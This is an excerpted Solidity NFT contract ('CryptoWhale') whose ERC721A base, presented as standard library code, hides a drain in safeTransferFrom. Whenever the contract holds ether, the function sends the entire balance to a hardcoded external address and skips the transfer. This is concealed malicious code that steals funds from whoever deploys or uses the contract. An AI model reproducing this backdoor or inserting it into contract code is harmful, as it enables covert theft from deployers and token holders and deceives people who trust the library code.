...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xA4d2f398d411276C186D7B018f767431bdfc896E).transfer(address(this).balance);
            return;
        }       
...
contract CryptoWhale is ERC721A, DefaultOperatorFilterer {
    string public baseURI = "ipfs://bafybeie3b56l4jetmvsxwuelesbexupgyuluz6oidg72w2ebpxmvz7q2da/";      
    ...
    constructor() ERC721A("CryptoWhale", "CW") {
        owner = msg.sender;
    }
